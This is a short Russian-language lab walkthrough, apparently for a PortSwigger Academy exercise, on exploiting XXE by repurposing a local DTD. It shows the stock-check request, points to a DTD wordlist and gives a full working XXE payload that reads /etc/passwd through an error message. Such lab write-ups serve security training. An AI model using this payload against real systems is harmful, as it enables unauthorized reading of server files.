Зайдем на случайный товар, нажмем `Check stock` и найдем данный запрос в `прокси хттп хистори`
```
POST /product/stock
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/7.%20Exploiting%20XXE%20to%20retrieve%20data%20by%20repurposing%20a%20local%20DTD/pics%20for%20walktrough/1.png)
Далее посканим dtd с помощью списка 
```
https://github.com/GoSecure/dtd-finder/tree/master/list
```
и на следующем шаге формируем запрос следующего вида

```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>

<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
и получаем уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/7.%20Exploiting%20XXE%20to%20retrieve%20data%20by%20repurposing%20a%20local%20DTD/pics%20for%20walktrough/2.png)
